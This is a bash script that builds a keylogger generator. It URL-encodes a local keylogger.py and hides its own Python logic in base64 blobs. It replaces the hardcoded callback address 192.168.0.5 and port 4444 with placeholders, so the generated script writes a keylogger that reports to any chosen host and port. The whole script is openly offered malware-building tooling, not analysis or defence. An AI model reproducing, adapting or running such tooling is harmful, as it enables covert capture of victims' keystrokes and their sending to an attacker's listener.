#!/bin/bash

keylogger=$(cat keylogger.py | sed 's/\\/\\\\/g')
filename="keyloggerGenerator.py"

########## Generate urlencode file

echo "IyEvdXNyL2Jpbi9weXRob24zCgppbXBvcnQgdXJsbGliLnBhcnNlLCB0aW1lLCBzeXMKCmlmIGxl
bihzeXMuYXJndikgIT0gNDoKCXByaW50KGYiVXNhZ2U6IHB5dGhvbjMge3N5cy5hcmd2WzBdfSA8
aXA+IDxwb3J0PiA8ZmlsZW5hbWU+IikKCXN5cy5leGl0KCkKCmlwID0gc3lzLmFyZ3ZbMV0KcG9y
dCA9IHN5cy5hcmd2WzJdCmZpbGVuYW1lID0gc3lzLmFyZ3ZbM10KCg==" | base64 -d > $filename

echo "file = '''
$keylogger
'''" >> $filename

echo "cXVvdGVfZmlsZSA9IHVybGxpYi5wYXJzZS5xdW90ZShmaWxlKQpwcmludChxdW90ZV9maWxlKQpz
eXMuZXhpdCgp" | base64 -d >> $filename
python3 $filename j j j > urlencodefile.txt
rm -rf $filename

######### Generate final file

echo "IyEvdXNyL2Jpbi9weXRob24zCgppbXBvcnQgdXJsbGliLnBhcnNlLCB0aW1lLCBzeXMKCmlmIGxl
bihzeXMuYXJndikgIT0gNDoKCXByaW50KGYiVXNhZ2U6IHB5dGhvbjMge3N5cy5hcmd2WzBdfSA8
aXA+IDxwb3J0PiA8ZmlsZW5hbWU+IikKCXN5cy5leGl0KCkKCmlwID0gc3lzLmFyZ3ZbMV0KcG9y
dCA9IHN5cy5hcmd2WzJdCmZpbGVuYW1lID0gc3lzLmFyZ3ZbM10KCndpdGggb3BlbihmIntmaWxl
bmFtZX0ucHkiLCAidyIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6CglwcmludChmIlsqXSBHZW5l
cmF0aW5nIEZpbGUge2ZpbGVuYW1lfS5weSIp" | base64 -d > $filename

echo -e "\n\tfile = f\"$(cat urlencodefile.txt | sed 's/192.168.0.5/\{ip\}/g' | sed 's/4444/\{port\}/g')\"" >> $filename
echo "CXRpbWUuc2xlZXAoMSkKCSNxdW90ZV9maWxlID0gdXJsbGliLnBhcnNlLnF1b3RlKGZpbGUpCgkj
dW5xdW90ZV9maWxlID0gdXJsbGliLnBhcnNlLnVucXVvdGUoZmlsZSkKCWZpbGUgPSB1cmxsaWIu
cGFyc2UudW5xdW90ZShmaWxlKQoJZi53cml0ZShmaWxlKQoJcHJpbnQoIlsqXSBGaWxlIGdlbmVy
YXRlZCBzdWNjZXNzZnVsbHkiKQ==" | base64 -d >> $filename
rm -rf urlencodefile.txt
if [[ $(ls) == *$filename*  ]]; then
	echo -e "\n[+] File $filename generated successfully"
	chmod +x $filename
fi